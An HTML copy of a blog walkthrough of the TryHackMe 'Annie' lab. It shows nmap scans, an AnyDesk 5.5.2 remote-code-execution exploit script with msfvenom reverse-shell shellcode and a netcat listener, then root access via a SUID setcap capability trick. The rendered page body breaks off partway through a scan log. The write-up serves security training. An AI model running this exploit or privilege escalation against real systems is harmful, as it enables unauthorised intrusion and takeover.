<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>geobour98</title><meta name=keywords content><meta name=description content="üìÜ 27/08/2022 - geobour98 ‚åö 6 min
Introduction This is a TryHackMe room which can be found at: Annie
Remote access comes in different flavors.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0."><meta name=author content><link rel=canonical href=https://geobour98.com/write-ups/thm/annie/><meta name=google-site-verification content="G-VH8LGJGC27"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.min.c88963fe2d79462000fd0fb1b3737783c32855d340583e4523343f8735c787f0.css integrity="sha256-yIlj/i15RiAA/Q+xs3N3g8MoVdNAWD5FIzQ/hzXHh/A=" rel="preload stylesheet" as=style><link rel=preload href=logo.png as=image><script defer crossorigin=anonymous src=/assets/js/highlight.min.4dcb3c4f38462f66c6b6137227726f5543cb934cca9788f041c087e374491df2.js integrity="sha256-Tcs8TzhGL2bGthNyJ3JvVUPLk0zKl4jwQcCH43RJHfI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://geobour98.com/favicon/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://geobour98.com/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://geobour98.com/favicon/favicon-32x32.png><link rel=apple-touch-icon href=https://geobour98.com/favicon/apple-touch-icon.png><link rel=mask-icon href=https://geobour98.com/logo.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-VH8LGJGC27"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-VH8LGJGC27",{anonymize_ip:!1})}</script><meta property="og:title" content="TryHackMe - Annie"><meta property="og:description" content="üìÜ 27/08/2022 - geobour98 ‚åö 6 min
Introduction This is a TryHackMe room which can be found at: Annie
Remote access comes in different flavors.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0."><meta property="og:type" content="article"><meta property="og:url" content="https://geobour98.com/write-ups/thm/annie/"><meta property="og:image" content="https://geobour98.com/47"><meta property="article:section" content="write-ups"><meta property="og:site_name" content="geobour98"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://geobour98.com/47"><meta name=twitter:title content="TryHackMe - Annie"><meta name=twitter:description content="üìÜ 27/08/2022 - geobour98 ‚åö 6 min
Introduction This is a TryHackMe room which can be found at: Annie
Remote access comes in different flavors.
Reconnaissance & Scanning Perform nmap scan to identify open ports and services.
  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Write-ups","item":"https://geobour98.com/write-ups/"},{"@type":"ListItem","position":2,"name":"TryHackMe - Annie","item":"https://geobour98.com/write-ups/thm/annie/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe - Annie","name":"TryHackMe - Annie","description":"üìÜ 27/08/2022 - geobour98 ‚åö 6 min\nIntroduction This is a TryHackMe room which can be found at: Annie\nRemote access comes in different flavors.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0.","keywords":[],"articleBody":"üìÜ 27/08/2022 - geobour98 ‚åö 6 min\nIntroduction This is a TryHackMe room which can be found at: Annie\nRemote access comes in different flavors.\nReconnaissance \u0026 Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.235.134  geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:40 EEST Initiating Ping Scan at 13:40 Scanning 10.10.235.134 [2 ports] Completed Ping Scan at 13:40, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 13:40 Completed Parallel DNS resolution of 1 host. at 13:40, 0.00s elapsed Initiating Connect Scan at 13:40 Scanning 10.10.235.134 (10.10.235.134) [65535 ports] Discovered open port 22/tcp on 10.10.235.134 Discovered open port 40045/tcp on 10.10.235.134 Discovered open port 33401/tcp on 10.10.235.134 Discovered open port 7070/tcp on 10.10.235.134 Completed Connect Scan at 13:41, 75.81s elapsed (65535 total ports) Nmap scan report for 10.10.235.134 (10.10.235.134) Host is up (0.077s latency). Not shown: 65477 closed tcp ports (conn-refused), 54 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 7070/tcp open realserver 33401/tcp open unknown 40045/tcp open unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 76.00 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134  geobour98@kali:~$ sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 13:48 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating Ping Scan at 13:48 Scanning 10.10.235.134 [4 ports] Completed Ping Scan at 13:48, 0.17s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 13:48 Completed Parallel DNS resolution of 1 host. at 13:48, 0.00s elapsed Initiating SYN Stealth Scan at 13:48 Scanning 10.10.235.134 (10.10.235.134) [4 ports] Discovered open port 22/tcp on 10.10.235.134 Discovered open port 7070/tcp on 10.10.235.134 Completed SYN Stealth Scan at 13:48, 0.13s elapsed (4 total ports) Initiating Service scan at 13:48 Scanning 2 services on 10.10.235.134 (10.10.235.134) Completed Service scan at 13:48, 12.71s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #2) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #3) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #4) against 10.10.235.134 (10.10.235.134) Retrying OS detection (try #5) against 10.10.235.134 (10.10.235.134) Initiating Traceroute at 13:48 Completed Traceroute at 13:48, 0.11s elapsed Initiating Parallel DNS resolution of 1 host. at 13:48 Completed Parallel DNS resolution of 1 host. at 13:48, 0.00s elapsed NSE: Script scanning 10.10.235.134. Initiating NSE at 13:48 Completed NSE at 13:48, 4.29s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.48s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Nmap scan report for 10.10.235.134 (10.10.235.134) Host is up (0.10s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA) | 256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA) |_ 256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519) 7070/tcp open ssl/realserver? | ssl-cert: Subject: commonName=AnyDesk Client | Issuer: commonName=AnyDesk Client | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-03-23T20:04:30 | Not valid after: 2072-03-10T20:04:30 | MD5: 3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0 |_SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b |_ssl-date: TLS randomness does not represent time 33401/tcp closed unknown 40045/tcp closed unknown No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=8/27%OT=22%CT=33401%CU=35227%PV=Y%DS=2%DC=T%G=Y%TM=630 OS:9F69B%P=x86_64-pc-linux-gnu)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A OS:)SEQ(SP=109%GCD=1%ISR=109%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW6%O2=M505ST11N OS:W6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11NW6%O6=M505ST11)WIN(W1=F4B3 OS:%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505 OS:NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R OS:=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F= OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T= OS:40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)  Uptime guess: 8.332 days (since Fri Aug 19 05:50:26 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=265 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 40045/tcp) HOP RTT ADDRESS 1 65.90 ms 10.8.0.1 (10.8.0.1) 2 100.64 ms 10.10.235.134 (10.10.235.134)  NSE: Script Post-scanning. Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Initiating NSE at 13:48 Completed NSE at 13:48, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 31.82 seconds  Raw packets sent: 129 (9.702KB) | Rcvd: 87 (6.958KB) The interesting port is 7070, with AnyDesk Client service. After googling about anydesk client 7070 exploit we identified this great article: https://devel0pment.de/?p=1881 about AnyDesk UDP version 5.5.2 Remote Code execution. A string format vulnerability is exploited on UDP port 50001. So now we are going to perform a UDP nmap scan on that port.\n  Command: sudo nmap -sU -v -p 50001 10.10.235.134  geobour98@kali:~$ sudo nmap -sU -v -p 50001 10.10.235.134 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-27 15:40 EEST Initiating Ping Scan at 15:40 Scanning 10.10.235.134 [4 ports] Completed Ping Scan at 15:40, 0.13s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 15:40 Completed Parallel DNS resolution of 1 host. at 15:40, 0.01s elapsed Initiating UDP Scan at 15:40 Scanning 10.10.235.134 (10.10.235.134) [1 port] Completed UDP Scan at 15:40, 0.93s elapsed (1 total ports) Nmap scan report for 10.10.235.134 (10.10.235.134) Host is up (0.088s latency).  PORT STATE SERVICE 50001/udp open|filtered unknown  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds  Raw packets sent: 6 (288B) | Rcvd: 1 (28B) Exploitation The UDP port 50001 is either open or filtered by a firewall. Also, in the article there is a PoC python script in order to exploit the vulnerability, which can be found also with searchsploit command.\n  Command: searchsploit anydesk  geobour98@kali:~$ searchsploit anydesk ----------------------------------------------------------------------- ---------------------------------  Exploit Title | Path ----------------------------------------------------------------------- --------------------------------- AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation | windows/local/40410.txt AnyDesk 5.4.0 - Unquoted Service Path | windows/local/47883.txt AnyDesk 5.5.2 - Remote Code Execution | linux/remote/49613.py ----------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   Command to mirror (copy) the exploit: searchsploit -m linux/remote/49613.py  We have to change the ip variable with our Annie machine IP and generate python shellcode to replace the already created in order to get a reverse shell. It is generated with msfvenom.\n  Command: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b \"\\x00\\x25\\x26\" -f python -v shellcode  geobour98@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b \"\\x00\\x25\\x26\" -f python -v shellcode shellcode = b\"\" shellcode += b\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\" shellcode += b\"\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xf1\\x7c\\x94\" shellcode += b\"\\xa2\\x97\\xa9\\x17\\x7b\\x48\\x31\\x58\\x27\\x48\\x2d\" shellcode += b\"\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x9b\\x55\\xcc\\x3b\\xfd\" shellcode += b\"\\xab\\x48\\x11\\xf0\\x22\\x9b\\xa7\\xdf\\x3e\\x5f\\xc2\" shellcode += b\"\\xf3\\x7c\\x95\\x19\\x9d\\xa1\\xdf\\x49\\xa0\\x34\\x1d\" shellcode += b\"\\x44\\xfd\\xb9\\x4d\\x11\\xdb\\x24\\x9b\\xa7\\xfd\\xaa\" shellcode += b\"\\x49\\x33\\x0e\\xb2\\xfe\\x83\\xcf\\xa6\\x12\\x0e\\x07\" shellcode += b\"\\x16\\xaf\\xfa\\x0e\\xe1\\xac\\x54\\x93\\x15\\xfa\\x8d\" shellcode += b\"\\xe4\\xc1\\x17\\x28\\xb9\\xf5\\x73\\xf0\\xc0\\xe1\\x9e\" shellcode += b\"\\x9d\\xfe\\x79\\x94\\xa2\\x97\\xa9\\x17\\x7b\" Then replace the shellcode in the python script with the generated one. The final version of the script should look like this:\n# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution # Date: 09/06/20 # Exploit Author: scryh # Vendor Homepage: https://anydesk.com/en # Version: 5.5.2 # Tested on: Linux # Walkthrough: https://devel0pment.de/?p=1881  #!/usr/bin/env python import struct import socket import sys  ip = '10.10.235.134' port = 50001  def gen_discover_packet(ad_id, os, hn, user, inf, func):  d = chr(0x3e)+chr(0xd1)+chr(0x1)  d += struct.pack('I', ad_id)  d += struct.pack('I', 0)  d += chr(0x2)+chr(os)  d += struct.pack('I', len(hn)) + hn  d += struct.pack('I', len(user)) + user  d += struct.pack('I', 0)  d += struct.pack('I', len(inf)) + inf  d += chr(0)  d += struct.pack('I', len(func)) + func  d += chr(0x2)+chr(0xc3)+chr(0x51)  return d  # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b \"\\x00\\x25\\x26\" -f python -v shellcode shellcode = b\"\" shellcode += b\"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xf6\\xff\\xff\\xff\\x48\" shellcode += b\"\\x8d\\x05\\xef\\xff\\xff\\xff\\x48\\xbb\\xf1\\x7c\\x94\" shellcode += b\"\\xa2\\x97\\xa9\\x17\\x7b\\x48\\x31\\x58\\x27\\x48\\x2d\" shellcode += b\"\\xf8\\xff\\xff\\xff\\xe2\\xf4\\x9b\\x55\\xcc\\x3b\\xfd\" shellcode += b\"\\xab\\x48\\x11\\xf0\\x22\\x9b\\xa7\\xdf\\x3e\\x5f\\xc2\" shellcode += b\"\\xf3\\x7c\\x95\\x19\\x9d\\xa1\\xdf\\x49\\xa0\\x34\\x1d\" shellcode += b\"\\x44\\xfd\\xb9\\x4d\\x11\\xdb\\x24\\x9b\\xa7\\xfd\\xaa\" shellcode += b\"\\x49\\x33\\x0e\\xb2\\xfe\\x83\\xcf\\xa6\\x12\\x0e\\x07\" shellcode += b\"\\x16\\xaf\\xfa\\x0e\\xe1\\xac\\x54\\x93\\x15\\xfa\\x8d\" shellcode += b\"\\xe4\\xc1\\x17\\x28\\xb9\\xf5\\x73\\xf0\\xc0\\xe1\\x9e\" shellcode += b\"\\x9d\\xfe\\x79\\x94\\xa2\\x97\\xa9\\x17\\x7b\"  print('sending payload ...') p = gen_discover_packet(4919, 1, '\\x85\\xfe%1$*1$x%18x%165$ln'+shellcode, '\\x85\\xfe%18472249x%93$ln', 'ad', 'main') s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) s.sendto(p, (ip, port)) s.close() print('reverse shell should connect within 5 seconds')   Command: python2 49613.py  geobour98@kali:~$ python2 49613.py sending payload ... reverse shell should connect within 5 seconds Before running it, open a netcat listener on 443 port.\ngeobour98@kali:~$ nc -lvnp 443 connect to [10.8.200.50] from (UNKNOWN) [10.10.235.134] 60890 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' annie@desktop:/home/annie$ id uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) annie@desktop:/home/annie$ cat user.txt THM{[REDACTED]} Now we are the user annie and can read the user.txt flag.\nPrivilege Escalation Download linpeas.sh from PEASS-ng github page (https://github.com/carlospolop/PEASS-ng/releases/tag/20220821) and transfer it to the victim machine.\nannie@desktop:/home/annie$ chmod +x linpeas.sh annie@desktop:/home/annie$ ./linpeas.sh [REDACTED] ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Interesting Files ‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ SUID - Check easy privesc, exploits and write perms ‚ïö https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-xr-x 1 root root 10K Nov 16 2017 /sbin/setcap (Unknown SUID binary) [REDACTED] There is an interesting SUID /sbin/setcap. It is used to assign or remove capabilities. We can use it to assign capabilities to /home/annie/python3.6 which will be a copy of /usr/bin/python3.6.\nannie@desktop:/home/annie$ cp /usr/bin/python3.6 . annie@desktop:/home/annie$ setcap cap_setuid+ep /home/annie/python3.6 annie@desktop:/home/annie$ getcap -r / 2/dev/null /home/annie/python3.6 = cap_setuid+ep /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep annie@desktop:/home/annie$ ./python3.6 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")' root@desktop:/home/annie# id uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare) root@desktop:/root# cat root.txt THM{[REDACTED]} This process can be found in this great article: https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/\nProof of Concept (PoC image): anydesk udp msfvenom python linux linpeas suid setcap  ","wordCount":"1513","inLanguage":"en","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://geobour98.com/write-ups/thm/annie/"},"publisher":{"@type":"Organization","name":"geobour98","logo":{"@type":"ImageObject","url":"https://geobour98.com/favicon/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://geobour98.com/ accesskey=h title="geobour98 (Alt + H)"><img src=https://geobour98.com/logo.png alt=logo aria-label=logo height=35>geobour98</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu><li><a href=https://geobour98.com/about/ title=About><span>About</span></a></li><li><a href=https://geobour98.com/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://geobour98.com/write-ups/ title=Write-ups><span>Write-ups</span></a></li><li><a href=https://geobour98.com/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://geobour98.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>TryHackMe - Annie</h1><div class=post-meta></div></header><div class=post-content><p>üìÜ 27/08/2022 - geobour98<br>‚åö 6 min</p><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p>This is a <strong>TryHackMe</strong> room which can be found at:
<a href=https://tryhackme.com/room/annie target=_blank style=color:#e30f0f>Annie</a></p><p>Remote access comes in different flavors.</p><h2 id=reconnaissance--scanning>Reconnaissance & Scanning<a hidden class=anchor aria-hidden=true href=#reconnaissance--scanning>#</a></h2><p>Perform <code>nmap</code> scan to identify open ports and services.</p><ul><li>Command: <code>nmap -p- -T4 -v 10.10.235.134</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nmap -p- -T4 -v 10.10.235.134
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-27 13:40 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 13:40
</span></span><span style=display:flex><span>Scanning 10.10.235.134 <span style=color:#f92672>[</span><span style=color:#ae81ff>2</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 13:40, 0.12s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:40
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:40, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating Connect Scan at 13:40
</span></span><span style=display:flex><span>Scanning 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>65535</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.235.134
</span></span><span style=display:flex><span>Discovered open port 40045/tcp on 10.10.235.134
</span></span><span style=display:flex><span>Discovered open port 33401/tcp on 10.10.235.134
</span></span><span style=display:flex><span>Discovered open port 7070/tcp on 10.10.235.134
</span></span><span style=display:flex><span>Completed Connect Scan at 13:41, 75.81s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>65535</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.077s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65477</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>, <span style=color:#ae81ff>54</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE
</span></span><span style=display:flex><span>22/tcp    open  ssh
</span></span><span style=display:flex><span>7070/tcp  open  realserver
</span></span><span style=display:flex><span>33401/tcp open  unknown
</span></span><span style=display:flex><span>40045/tcp open  unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 76.00 seconds
</span></span></code></pre></div><p>Perform aggressive <code>nmap</code> scan to enable OS detection, default scripts and version detection on the found ports.</p><ul><li>Command: <code>sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -A -sC -p 22,7070,33401,40045 -v 10.10.235.134
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-27 13:48 EEST                                         
</span></span><span style=display:flex><span>NSE: Loaded <span style=color:#ae81ff>155</span> scripts <span style=color:#66d9ef>for</span> scanning.                                                                    
</span></span><span style=display:flex><span>NSE: Script Pre-scanning.                                                                                
</span></span><span style=display:flex><span>Initiating NSE at 13:48                                                                                  
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed                                                                    
</span></span><span style=display:flex><span>Initiating NSE at 13:48                                                                                  
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed                                                                    
</span></span><span style=display:flex><span>Initiating NSE at 13:48                                                                                  
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed                                                                    
</span></span><span style=display:flex><span>Initiating Ping Scan at 13:48                                                                            
</span></span><span style=display:flex><span>Scanning 10.10.235.134 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>                                                                           
</span></span><span style=display:flex><span>Completed Ping Scan at 13:48, 0.17s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>                                              
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:48                                                   
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:48, 0.00s elapsed                                     
</span></span><span style=display:flex><span>Initiating SYN Stealth Scan at 13:48                                                                     
</span></span><span style=display:flex><span>Scanning 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>                                                             
</span></span><span style=display:flex><span>Discovered open port 22/tcp on 10.10.235.134                                                               
</span></span><span style=display:flex><span>Discovered open port 7070/tcp on 10.10.235.134                                                             
</span></span><span style=display:flex><span>Completed SYN Stealth Scan at 13:48, 0.13s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>4</span> total ports<span style=color:#f92672>)</span>                                       
</span></span><span style=display:flex><span>Initiating Service scan at 13:48
